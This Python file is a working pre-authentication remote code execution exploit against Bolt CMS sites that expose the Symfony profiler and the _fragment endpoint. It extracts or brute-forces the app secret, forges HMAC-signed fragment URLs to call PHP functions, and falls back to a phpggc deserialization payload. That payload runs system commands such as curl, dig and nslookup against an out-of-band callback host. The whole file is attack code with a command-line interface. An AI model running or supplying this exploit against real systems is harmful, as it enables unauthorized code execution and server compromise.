import hashlib
import hmac
import sys
import base64
import urllib3
import urllib.parse as up
import argparse
import requests
import subprocess
import os
import random
from selenium import webdriver
from selenium.webdriver.firefox.options import Options

urllib3.disable_warnings()
DEBUG = 1
S = requests.Session()
S.verify = False
OPTIONS = Options()
OPTIONS.headless = True
SLEEP = 5
SUFFIX = "/vendor/silex/silex/src/Silex/Provider"

def usage():
    # Display the banner if arguments
    # are not correctly set
    banner = """NAME: Bolt (Profiler), pre-auth RCE
SYNOPSIS: python rce.py <BASE_URL>/_fragment
DESCRIPTION:
    Variant of Symfony FragmentListener exploit:
    https://github.com/therealcoiffeur/therealcoiffeur.github.io/tree/master/tools/Symfony/FragmentListener
AUTHOR: coiffeur based on @cfreal_'s work
    """
    print(banner)

def calculate_bolt_secret(text):
    secrets = []
    printf("ok", f"Bolt detected with Profiler: extracting secret")
    start = text.find("SCRIPT_FILENAME") + len("SCRIPT_FILENAME")
    end = text[start::].find("</td>")
    prefix = text[start:start+end].replace("</th>","").replace("<td>","").strip()
    for i in range(len(prefix.split("/")), 1, -1):
        m = hashlib.md5()
        path = "/".join(prefix.split("/")[0:i-1]) + SUFFIX
        m.update(path.encode())
        secrets.append(m.hexdigest())
    return secrets

class Fragment:

    secret = ""
    payload = ""
    hash = ""

    def __init__(self, url):
        self.url = url

    def master_request(self):
        # Try to detect the presence of
        # the fragment listener based
        # on the status code return
        # by the server. The response
        # status code must but "403 Forbiden".
        #
        # return (bool) True if the /_fragment
        # is detected False otherwise.
        condition = 0
        try:
            r = S.get(self.url)
            if r.status_code == 403 or r.status_code == 500:
                condition = 1
        except:
            self.url = self.url.replace("https", "http")
            r = S.get(self.url.replace("https", "http"))
            if r.status_code == 403 or r.status_code == 500:
                condition = 1
        if condition:
            printf("ok", f"{self.url} detected")
            if r.text.find("SCRIPT_FILENAME"):
                self.secret = calculate_bolt_secret(r.text)
                if self.secret == "":
                    printf("er", f"Extraction failed")
            return True
        printf("er", f"{self.url} not detected !")
        return False

    def check(self):
        # Checks that a URI contains the correct hash.
        #
        # return (bool) True if the URI is signed
        # correctly, False otherwise.
        self.payload = self.url
        self.compute_hash()
        r = S.get(
            f"{self.payload}?_hash={up.quote_plus(self.hash.decode())}")
        if r.status_code != 403:
            printf("ok", f"secret: {self.secret}")
            return True
        return False

    def controller(self):
        # Checks that it is possible to trigger
        # phpinfo ([ int $what = INFO_ALL ] ) : bool
        # or
        # sleep ( int $seconds ) : int
        # functions.
        #
        # return (array[bool]) [True, url] if the functions
        # has been executed, False otherwise.
        printf("un", f"Using _controller with PHP's functions ...")
        results = []
        payloads = [
            {"function": "phpinfo", "parameters": [
                {"name": "what", "value": -1}]},
            {"function": "sleep", "parameters": [
                {"name": "seconds", "value": SLEEP}]}
        ]
        for payload in payloads:
            query = f"_controller={payload['function']}"
            for parameter in payload['parameters']:
                query += f"&{parameter['name']}={parameter['value']}"
            self.payload = f"{self.url}?_path={up.quote_plus(query)}"
            self.compute_hash()
            r = S.get(
                f"{self.payload}&_hash={up.quote_plus(self.hash.decode())}")
            condition = [
                payload['function'] == "phpinfo" and "PHP Version" in r.text,
                payload['function'] == "sleep" and r.elapsed.total_seconds() > SLEEP/2
            ]
            if condition[0] or condition[1]:
                results.append([True, r.url])
                break
        return results

    def yaml(self, oob_url, parse_url):
        # Checks that it is possible to trigger
        # an Out Of Bound RCE using Symfony\Component\Yaml\Inline
        # to leverage a call to unserialize.
        #
        # return (array[bool]) [True, url] if the functions
        # has been executed, False otherwise.
        printf("un", f"Using _controller with Yaml's Inline::parser() function ...")
        results = []
        payloads = [
            {"function": "system", "parameter": f"host {oob_url}"},
            {"function": "system", "parameter": f"dig {oob_url}"},
            {"function": "system", "parameter": f"nslookup {oob_url}"},
            {"function": "system", "parameter": f"curl http://{oob_url}"}
        ]
        for payload in payloads:
            query = "_controller=Symfony\\Component\\Yaml\\Inline::parse"
            try:
                out = subprocess.check_output(
                    ["./lib/phpggc/phpggc",
                     "-s",
                     "monolog/rce1",
                     payload['function'],
                     payload['parameter']])
                query += f"&value=!php/object '{out.decode()}'"
            except:
                pass
            query += "&flags=4"
            query += "&references[]="
            self.payload = f"{self.url}?_path={up.quote_plus(query)}"
            self.compute_hash()
            r = S.get(
                f"{self.payload}&_hash={up.quote_plus(self.hash.decode())}")
            driver.get(parse_url)
            elt = driver.find_element_by_id(id_='requests')
            condition = "mydatahere" in elt.text
            if condition:
                results.append([True, r.url])
                break
        return results

    def compute_hash(self):
        # Try to compute the hash expected by
        # the public function check().
        #
        # return (string) url encoded ( base64 encoded ( hmac ) ).
        self.hash = base64.b64encode(hmac.digest(
            self.secret.encode(), self.payload.encode(), "sha256"))


def printf(t, msg):
    # Print a colored message
    # "ok" -> GREEN (operation succeed)
    # "er" -> RED (operation failed)
    # "un" -> BLUE (operation running)
    if t == "ok":
        print(f"\033[0;32m[*]\033[0;0m {msg}")
    if t == "er":
        print(f"\033[1;31m[x]\033[0;0m {msg}")
    if t == "un":
        print(f"\033[1;34m[ ]\033[0;0m {msg}")


def main(url, app_secret, oob_url="", parse_url="", driver=None):
    frag = Fragment(url)
    if not(frag.master_request()):
        exit(-1)

    if app_secret:
        secrets = [app_secret]
    elif isinstance(frag.secret, list):
        secrets = frag.secret
    else:
        secrets = []
        with open("secrets.txt", "r") as f:
            secrets = f.readlines()
        printf("un", f"Looking for secret ...")

    for secret in secrets:
        frag.secret = secret.rstrip("\n")
        check = frag.check()
        if check:
            results = frag.controller()
            if not results:
                results = frag.yaml(oob_url, parse_url)
            if results:
                for result in results:
                    if result[0]:
                        printf("ok", f"Exploit succeed:\n\t{result[1]}")
                        exit(0)

    printf("er", f"Exploit failed, secret not found!")
    exit(-1)


if __name__ == "__main__":
    if (len(sys.argv) < 2):
        usage()

    parser = argparse.ArgumentParser()
    parser.add_argument("url", help="URL of the target <BASE_URL>/_fragment")
    parser.add_argument("--secret", "-s", help="Secret used to calculate hmac")

    parser.add_argument("--oob", "-o", help="Yaml method: OOB DNSbin")
    parser.add_argument("--parse", "-p", help="Yaml method: parse OOB result")

    args = parser.parse_args()

    if args.oob and args.parse:
        driver = webdriver.Firefox(options=OPTIONS)
        main(args.url, args.secret, args.oob, args.parse, driver)
    main(args.url, args.secret)
